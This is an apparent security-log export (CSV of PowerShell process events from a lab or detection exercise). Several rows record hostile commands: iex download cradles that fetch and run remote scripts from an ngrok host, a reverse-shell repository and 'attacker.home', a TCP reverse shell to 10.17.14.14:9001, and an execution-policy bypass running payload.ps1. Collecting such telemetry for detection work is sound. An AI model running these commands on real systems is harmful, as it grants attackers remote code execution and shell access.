"@timestamp","process.name","process.command_line","process.args","event.code","winlog.event_id"
"Jun 4, 2025 @ 21:07:43.327","powershell.exe","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -command ""iex(New-Object Net.WebClient).DownloadString(‘ https://8edc-2401-4900-9156-fb4c-31f2-a653-5640-e4c9.ngrok-free.app/shell.ps1’)""","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, -command, iex(New-Object Net.WebClient).DownloadString(‘ https://8edc-2401-4900-9156-fb4c-31f2-a653-5640-e4c9.ngrok-free.app/shell.ps1’)",behavior,"-"
"Jun 4, 2025 @ 21:07:43.299","powershell.exe","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -command ""iex(New-Object Net.WebClient).DownloadString(‘ https://8edc-2401-4900-9156-fb4c-31f2-a653-5640-e4c9.ngrok-free.app/shell.ps1’)""","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, -command, iex(New-Object Net.WebClient).DownloadString(‘ https://8edc-2401-4900-9156-fb4c-31f2-a653-5640-e4c9.ngrok-free.app/shell.ps1’)","-","-"
"Jun 4, 2025 @ 21:07:43.245","powershell.exe","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -command ""iex(New-Object Net.WebClient).DownloadString(‘ https://8edc-2401-4900-9156-fb4c-31f2-a653-5640-e4c9.ngrok-free.app/shell.ps1’)""","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, -command, iex(New-Object Net.WebClient).DownloadString(‘ https://8edc-2401-4900-9156-fb4c-31f2-a653-5640-e4c9.ngrok-free.app/shell.ps1’)",behavior,"-"
"Jun 4, 2025 @ 21:07:43.121","powershell.exe","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -nop -c "" = New-Object System.Net.Sockets.TCPClient('10.17.14.14',9001); = .GetStream();[byte[]] = 0..65535|%{0};while(( = .Read(, 0, .Length)) -ne 0){; = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(,0, ); = (iex  2>&1 | Out-String ); =  + 'PS ' + (pwd).Path + '> '; = ([text.encoding]::ASCII).GetBytes();.Write(,0,.Length);.Flush()};.Close()""","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, -nop, -c,  = New-Object System.Net.Sockets.TCPClient('10.17.14.14',9001); = .GetStream();[byte[]] = 0..65535|%{0};while(( = .Read(, 0, .Length)) -ne 0){; = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(,0, ); = (iex  2>&1 | Out-String ); =  + 'PS ' + (pwd).Path + '> '; = ([text.encoding]::ASCII).GetBytes();.Write(,0,.Length);.Flush()};.Close()","-","-"
"Jun 4, 2025 @ 21:07:43.121","powershell.exe","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -nop -c "" = New-Object System.Net.Sockets.TCPClient('10.17.14.14',9001); = .GetStream();[byte[]] = 0..65535|%%{0};while(( = .Read(, 0, .Length)) -ne 0){; = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(,0, ); = (iex  2>&1 | Out-String ); =  + 'PS ' + (pwd).Path + '> '; = ([text.encoding]::ASCII).GetBytes();.Write(,0,.Length);.Flush()};.Close()""","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, -nop, -c,  = New-Object System.Net.Sockets.TCPClient('10.17.14.14',9001); = .GetStream();[byte[]] = 0..65535|%%{0};while(( = .Read(, 0, .Length)) -ne 0){; = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(,0, ); = (iex  2>&1 | Out-String ); =  + 'PS ' + (pwd).Path + '> '; = ([text.encoding]::ASCII).GetBytes();.Write(,0,.Length);.Flush()};.Close()",1,1
"Jun 4, 2025 @ 21:07:37.803","powershell.exe","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -command ""iex(New-Object Net.WebClient).DownloadString(‘ https://8edc-2401-4900-9156-fb4c-31f2-a653-5640-e4c9.ngrok-free.app/shell.ps1’)""","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, -command, iex(New-Object Net.WebClient).DownloadString(‘ https://8edc-2401-4900-9156-fb4c-31f2-a653-5640-e4c9.ngrok-free.app/shell.ps1’)","-","-"
"Jun 4, 2025 @ 21:07:37.803","powershell.exe","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -command ""iex(New-Object Net.WebClient).DownloadString(‘ https://8edc-2401-4900-9156-fb4c-31f2-a653-5640-e4c9.ngrok-free.app/shell.ps1’)""","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, -command, iex(New-Object Net.WebClient).DownloadString(‘ https://8edc-2401-4900-9156-fb4c-31f2-a653-5640-e4c9.ngrok-free.app/shell.ps1’)",1,1
"Jun 4, 2025 @ 21:03:12.364","powershell.exe","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -command ""iex(New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/gh0x0st/Get-ReverseShell/refs/heads/main/get-reverseshell.ps1’)""","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, -command, iex(New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/gh0x0st/Get-ReverseShell/refs/heads/main/get-reverseshell.ps1’)",behavior,"-"
"Jun 4, 2025 @ 21:03:06.892","powershell.exe","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -command ""iex(New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/gh0x0st/Get-ReverseShell/refs/heads/main/get-reverseshell.ps1’)""","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, -command, iex(New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/gh0x0st/Get-ReverseShell/refs/heads/main/get-reverseshell.ps1’)","-","-"
"Jun 4, 2025 @ 21:03:06.892","powershell.exe","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -command ""iex(New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/gh0x0st/Get-ReverseShell/refs/heads/main/get-reverseshell.ps1’)""","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, -command, iex(New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/gh0x0st/Get-ReverseShell/refs/heads/main/get-reverseshell.ps1’)",1,1
"Jun 4, 2025 @ 21:01:29.980","powershell.exe","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -command ""iex(New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/gh0x0st/Get-ReverseShell/refs/heads/main/get-reverseshell.ps1’)""","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, -command, iex(New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/gh0x0st/Get-ReverseShell/refs/heads/main/get-reverseshell.ps1’)",behavior,"-"
"Jun 4, 2025 @ 21:01:24.335","powershell.exe","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -command ""iex(New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/gh0x0st/Get-ReverseShell/refs/heads/main/get-reverseshell.ps1’)""","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, -command, iex(New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/gh0x0st/Get-ReverseShell/refs/heads/main/get-reverseshell.ps1’)","-","-"
"Jun 4, 2025 @ 21:01:24.335","powershell.exe","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -command ""iex(New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/gh0x0st/Get-ReverseShell/refs/heads/main/get-reverseshell.ps1’)""","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, -command, iex(New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/gh0x0st/Get-ReverseShell/refs/heads/main/get-reverseshell.ps1’)",1,1
"Jun 4, 2025 @ 20:56:36.798","powershell.exe","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -command ""iex(New-Object Net.WebClient).DownloadString(‘http://attacker.home/myscript.ps1’)""","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, -command, iex(New-Object Net.WebClient).DownloadString(‘http://attacker.home/myscript.ps1’)","-","-"
"Jun 4, 2025 @ 20:56:36.798","powershell.exe","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -command ""iex(New-Object Net.WebClient).DownloadString(‘http://attacker.home/myscript.ps1’)""","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, -command, iex(New-Object Net.WebClient).DownloadString(‘http://attacker.home/myscript.ps1’)",1,1
"Jun 4, 2025 @ 20:17:00.269","powershell.exe","powershell.exe -ExecutionPolicy Restricted -Command  $Res = 0; $Infs = Get-Item -Path ($env:WinDir + '\inf\*.inf'); foreach ($Inf in $Infs) { $Data = Get-Content $Inf.FullName; if ($Data -match '\[defaultinstall.nt(amd64|arm|arm64|x86)\]') { $Res = 1; break; } } Write-Host 'Final result:', $Res;","powershell.exe, -ExecutionPolicy, Restricted, -Command, $Res, =, 0;, $Infs, =, Get-Item, -Path, ($env:WinDir, +, '\inf\*.inf');, foreach, ($Inf, in, $Infs), {, $Data, =, Get-Content, $Inf.FullName;, if, ($Data, -match, '\[defaultinstall.nt(amd64|arm|arm64|x86)\]'), {, $Res, =, 1;, break;, }, }, Write-Host, 'Final, result:',, $Res;","-","-"
"Jun 4, 2025 @ 20:16:48.920","powershell.exe","powershell.exe -ExecutionPolicy Restricted -Command  $Res = 0; $Infs = Get-Item -Path ($env:WinDir + '\inf\*.inf'); foreach ($Inf in $Infs) { $Data = Get-Content $Inf.FullName; if ($Data -match '\[defaultinstall.nt(amd64|arm|arm64|x86)\]') { $Res = 1; break; } } Write-Host 'Final result:', $Res;","powershell.exe, -ExecutionPolicy, Restricted, -Command, $Res, =, 0;, $Infs, =, Get-Item, -Path, ($env:WinDir, +, '\inf\*.inf');, foreach, ($Inf, in, $Infs), {, $Data, =, Get-Content, $Inf.FullName;, if, ($Data, -match, '\[defaultinstall.nt(amd64|arm|arm64|x86)\]'), {, $Res, =, 1;, break;, }, }, Write-Host, 'Final, result:',, $Res;","-","-"
"Jun 4, 2025 @ 20:16:48.920","powershell.exe","powershell.exe -ExecutionPolicy Restricted -Command $res = 0; if(get-vmswitch | Where {$_.NetAdapterInterfaceDescription -ne $null -and $_.NetAdapterInterfaceDescription -eq (Get-NetLbfoTeamNic).InterfaceDescription}){$res=1}; Write-Host ""Final result:"", $res","powershell.exe, -ExecutionPolicy, Restricted, -Command, $res, =, 0;, if(get-vmswitch, |, Where, {$_.NetAdapterInterfaceDescription, -ne, $null, -and, $_.NetAdapterInterfaceDescription, -eq, (Get-NetLbfoTeamNic).InterfaceDescription}){$res=1};, Write-Host, Final result:,, $res","-","-"
"Jun 4, 2025 @ 20:16:18.287","powershell.exe","powershell.exe -ExecutionPolicy Restricted -Command $res = 0; if(get-vmswitch | Where {$_.NetAdapterInterfaceDescription -ne $null -and $_.NetAdapterInterfaceDescription -eq (Get-NetLbfoTeamNic).InterfaceDescription}){$res=1}; Write-Host ""Final result:"", $res","powershell.exe, -ExecutionPolicy, Restricted, -Command, $res, =, 0;, if(get-vmswitch, |, Where, {$_.NetAdapterInterfaceDescription, -ne, $null, -and, $_.NetAdapterInterfaceDescription, -eq, (Get-NetLbfoTeamNic).InterfaceDescription}){$res=1};, Write-Host, Final result:,, $res","-","-"
"Jun 4, 2025 @ 20:14:33.919","powershell.exe","powershell.exe -ExecutionPolicy Restricted -Command $res = 0; if(get-vmswitch | Where {$_.NetAdapterInterfaceDescription -ne $null -and $_.NetAdapterInterfaceDescription -eq (Get-NetLbfoTeamNic).InterfaceDescription}){$res=1}; Write-Host ""Final result:"", $res","powershell.exe, -ExecutionPolicy, Restricted, -Command, $res, =, 0;, if(get-vmswitch, |, Where, {$_.NetAdapterInterfaceDescription, -ne, $null, -and, $_.NetAdapterInterfaceDescription, -eq, (Get-NetLbfoTeamNic).InterfaceDescription}){$res=1};, Write-Host, Final result:,, $res","-","-"
"Jun 4, 2025 @ 20:14:33.919","powershell.exe","powershell.exe -ExecutionPolicy Restricted -Command $res = 0; if(get-vmswitch | Where {$_.NetAdapterInterfaceDescription -ne $null -and $_.NetAdapterInterfaceDescription -eq (Get-NetLbfoTeamNic).InterfaceDescription}){$res=1}; Write-Host ""Final result:"", $res","powershell.exe, -ExecutionPolicy, Restricted, -Command, $res, =, 0;, if(get-vmswitch, |, Where, {$_.NetAdapterInterfaceDescription, -ne, $null, -and, $_.NetAdapterInterfaceDescription, -eq, (Get-NetLbfoTeamNic).InterfaceDescription}){$res=1};, Write-Host, Final result:,, $res",1,1
"Jun 4, 2025 @ 20:14:31.511","powershell.exe","powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';","powershell.exe, -ExecutionPolicy, Restricted, -Command, Write-Host, 'Final, result:, 1';","-","-"
"Jun 4, 2025 @ 20:14:12.367","powershell.exe","powershell.exe -ExecutionPolicy Restricted -Command  $Res = 0; $Infs = Get-Item -Path ($env:WinDir + '\inf\*.inf'); foreach ($Inf in $Infs) { $Data = Get-Content $Inf.FullName; if ($Data -match '\[defaultinstall.nt(amd64|arm|arm64|x86)\]') { $Res = 1; break; } } Write-Host 'Final result:', $Res;","powershell.exe, -ExecutionPolicy, Restricted, -Command, $Res, =, 0;, $Infs, =, Get-Item, -Path, ($env:WinDir, +, '\inf\*.inf');, foreach, ($Inf, in, $Infs), {, $Data, =, Get-Content, $Inf.FullName;, if, ($Data, -match, '\[defaultinstall.nt(amd64|arm|arm64|x86)\]'), {, $Res, =, 1;, break;, }, }, Write-Host, 'Final, result:',, $Res;","-","-"
"Jun 4, 2025 @ 20:14:12.367","powershell.exe","powershell.exe -ExecutionPolicy Restricted -Command  $Res = 0; $Infs = Get-Item -Path ($env:WinDir + '\inf\*.inf'); foreach ($Inf in $Infs) { $Data = Get-Content $Inf.FullName; if ($Data -match '\[defaultinstall.nt(amd64|arm|arm64|x86)\]') { $Res = 1; break; } } Write-Host 'Final result:', $Res;","powershell.exe, -ExecutionPolicy, Restricted, -Command, $Res, =, 0;, $Infs, =, Get-Item, -Path, ($env:WinDir, +, '\inf\*.inf');, foreach, ($Inf, in, $Infs), {, $Data, =, Get-Content, $Inf.FullName;, if, ($Data, -match, '\[defaultinstall.nt(amd64|arm|arm64|x86)\]'), {, $Res, =, 1;, break;, }, }, Write-Host, 'Final, result:',, $Res;",1,1
"Jun 4, 2025 @ 20:14:04.744","powershell.exe","powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';","powershell.exe, -ExecutionPolicy, Restricted, -Command, Write-Host, 'Final, result:, 1';","-","-"
"Jun 4, 2025 @ 20:14:04.744","powershell.exe","powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';","powershell.exe, -ExecutionPolicy, Restricted, -Command, Write-Host, 'Final, result:, 1';",1,1
"Jun 4, 2025 @ 20:13:51.735","powershell.exe","powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';","powershell.exe, -ExecutionPolicy, Restricted, -Command, Write-Host, 'Final, result:, 1';","-","-"
"Jun 4, 2025 @ 20:13:48.494","powershell.exe","powershell.exe -ExecutionPolicy Restricted -Command $res = 0; if(get-vmswitch | Where {$_.NetAdapterInterfaceDescription -ne $null -and $_.NetAdapterInterfaceDescription -eq (Get-NetLbfoTeamNic).InterfaceDescription}){$res=1}; Write-Host ""Final result:"", $res","powershell.exe, -ExecutionPolicy, Restricted, -Command, $res, =, 0;, if(get-vmswitch, |, Where, {$_.NetAdapterInterfaceDescription, -ne, $null, -and, $_.NetAdapterInterfaceDescription, -eq, (Get-NetLbfoTeamNic).InterfaceDescription}){$res=1};, Write-Host, Final result:,, $res","-","-"
"Jun 4, 2025 @ 20:13:48.494","powershell.exe","powershell.exe -ExecutionPolicy Restricted -Command $res = 0; if(get-vmswitch | Where {$_.NetAdapterInterfaceDescription -ne $null -and $_.NetAdapterInterfaceDescription -eq (Get-NetLbfoTeamNic).InterfaceDescription}){$res=1}; Write-Host ""Final result:"", $res","powershell.exe, -ExecutionPolicy, Restricted, -Command, $res, =, 0;, if(get-vmswitch, |, Where, {$_.NetAdapterInterfaceDescription, -ne, $null, -and, $_.NetAdapterInterfaceDescription, -eq, (Get-NetLbfoTeamNic).InterfaceDescription}){$res=1};, Write-Host, Final result:,, $res",1,1
"Jun 4, 2025 @ 20:13:27.055","powershell.exe","powershell.exe -ExecutionPolicy Restricted -Command  $Res = 0; $Infs = Get-Item -Path ($env:WinDir + '\inf\*.inf'); foreach ($Inf in $Infs) { $Data = Get-Content $Inf.FullName; if ($Data -match '\[defaultinstall.nt(amd64|arm|arm64|x86)\]') { $Res = 1; break; } } Write-Host 'Final result:', $Res;","powershell.exe, -ExecutionPolicy, Restricted, -Command, $Res, =, 0;, $Infs, =, Get-Item, -Path, ($env:WinDir, +, '\inf\*.inf');, foreach, ($Inf, in, $Infs), {, $Data, =, Get-Content, $Inf.FullName;, if, ($Data, -match, '\[defaultinstall.nt(amd64|arm|arm64|x86)\]'), {, $Res, =, 1;, break;, }, }, Write-Host, 'Final, result:',, $Res;","-","-"
"Jun 4, 2025 @ 20:13:27.055","powershell.exe","powershell.exe -ExecutionPolicy Restricted -Command  $Res = 0; $Infs = Get-Item -Path ($env:WinDir + '\inf\*.inf'); foreach ($Inf in $Infs) { $Data = Get-Content $Inf.FullName; if ($Data -match '\[defaultinstall.nt(amd64|arm|arm64|x86)\]') { $Res = 1; break; } } Write-Host 'Final result:', $Res;","powershell.exe, -ExecutionPolicy, Restricted, -Command, $Res, =, 0;, $Infs, =, Get-Item, -Path, ($env:WinDir, +, '\inf\*.inf');, foreach, ($Inf, in, $Infs), {, $Data, =, Get-Content, $Inf.FullName;, if, ($Data, -match, '\[defaultinstall.nt(amd64|arm|arm64|x86)\]'), {, $Res, =, 1;, break;, }, }, Write-Host, 'Final, result:',, $Res;",1,1
"Jun 4, 2025 @ 20:13:17.462","powershell.exe","powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';","powershell.exe, -ExecutionPolicy, Restricted, -Command, Write-Host, 'Final, result:, 1';","-","-"
"Jun 4, 2025 @ 20:13:17.462","powershell.exe","powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';","powershell.exe, -ExecutionPolicy, Restricted, -Command, Write-Host, 'Final, result:, 1';",1,1
"Jun 4, 2025 @ 19:45:10.759","powershell.exe","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -ExecutionPolicy Bypass -File C:\payload.ps1","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, -ExecutionPolicy, Bypass, -File, C:\payload.ps1","-","-"
"Jun 4, 2025 @ 19:45:10.759","powershell.exe","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -ExecutionPolicy Bypass -File C:\payload.ps1","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, -ExecutionPolicy, Bypass, -File, C:\payload.ps1",1,1
"Jun 4, 2025 @ 19:44:58.129","powershell.exe","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -ExecutionPolicy Bypass -File C:\payload.ps1","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, -ExecutionPolicy, Bypass, -File, C:\payload.ps1","-","-"
"Jun 4, 2025 @ 19:44:48.288","powershell.exe","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -ExecutionPolicy Bypass -File C:\payload.ps1","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, -ExecutionPolicy, Bypass, -File, C:\payload.ps1","-","-"
"Jun 4, 2025 @ 19:44:48.288","powershell.exe","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -ExecutionPolicy Bypass -File C:\payload.ps1","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, -ExecutionPolicy, Bypass, -File, C:\payload.ps1",1,1
"Jun 4, 2025 @ 19:44:09.178","powershell.exe","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","-","-"
"Jun 4, 2025 @ 19:44:09.178","powershell.exe","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",1,1
